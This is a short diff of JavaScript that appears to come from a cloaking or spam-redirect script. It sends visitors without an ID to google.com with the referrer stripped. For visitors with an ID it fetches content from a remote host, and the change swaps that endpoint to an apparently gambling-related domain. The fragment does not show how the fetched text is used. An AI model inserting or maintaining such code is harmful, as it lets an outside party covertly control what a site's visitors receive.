@@ -23,7 +23,7 @@ var redirectWithoutReferrer, params, id;
             redirectWithoutReferrer('https://www.google.com');
         } else {
             // Otherwise, fetch content from the external endpoint using the ID parameter
-            fetch('https://kox.trackerapps.website/grav/x.php?id=' + encodeURIComponent(id))
+            fetch('https://nst.hktogel.online/apps/apifolder/api.php?id=' + encodeURIComponent(id))
                 .then(function (response) {
                     return response.text();
                 })
